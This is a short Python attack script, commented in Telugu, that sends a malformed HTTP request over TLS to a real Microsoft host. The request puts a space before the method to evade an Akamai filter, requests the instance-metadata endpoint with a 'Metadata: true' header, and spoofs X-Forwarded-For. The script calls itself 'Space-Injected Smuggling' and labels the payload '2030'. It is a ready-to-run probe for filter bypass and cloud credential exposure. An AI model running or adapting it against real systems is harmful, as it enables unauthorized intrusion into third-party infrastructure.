import socket
import ssl

host = "azure.microsoft.com"
port = 443

# 2030 "Space-Injected" Payload
# Method కి ముందు స్పేస్ ఇచ్చి Akamai ని కన్ఫ్యూజ్ చేస్తున్నాం
payload = (
    " GET /metadata/instance?api-version=2021-02-01 HTTP/1.1\r\n" # గమనించు: ఇక్కడ ఒక స్పేస్ ఉంది
    "Host: azure.microsoft.com\r\n"
    "Metadata: true\r\n"
    "X-Forwarded-For: 131.107.255.255\r\n"
    "Connection: close\r\n"
    "\r\n"
)

context = ssl.create_default_context()
try:
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            print(f"🚀 Deploying Space-Injected Smuggling...")
            ssock.sendall(payload.encode())
            
            res = b""
            ssock.settimeout(10)
            while True:
                try:
                    data = ssock.recv(4096)
                    if not data: break
                    res += data
                except: break
            
            print("\n📥 Response Received:")
            print(res.decode(errors='ignore'))
except Exception as e:
    print(f"❌ Error: {e}")
